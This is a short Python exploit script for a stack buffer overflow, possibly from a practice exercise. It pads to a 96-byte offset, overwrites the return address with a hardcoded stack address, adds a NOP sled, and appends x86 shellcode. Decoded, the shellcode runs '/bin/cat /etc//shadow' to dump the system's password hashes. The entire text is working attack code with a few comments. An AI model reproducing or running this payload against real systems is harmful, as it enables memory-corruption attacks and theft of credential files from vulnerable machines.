# buffer overflow
# test thingy for a thingy

import struct

offset = 96 # pointer offset
rp = struct.pack("<L", 0xffffd420) # convert to little endian

nop = "\x90" # nop sled - no matter where you point EIP inside nop it'll continue execution (unreliable GNB memory addresses)

# shellcode
payload = "\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x61\x64\x6f\x77\x68\x2f\x2f\x73\x68\x68\x2f\x65\x74\x63\x89\xe1\x50\x51\x53\x89\xe1\xb0\x0b\xcd\x80"

# pull everything together
exploit = ("A" * offset) + rp + (nop * 200) + payload

print(exploit)
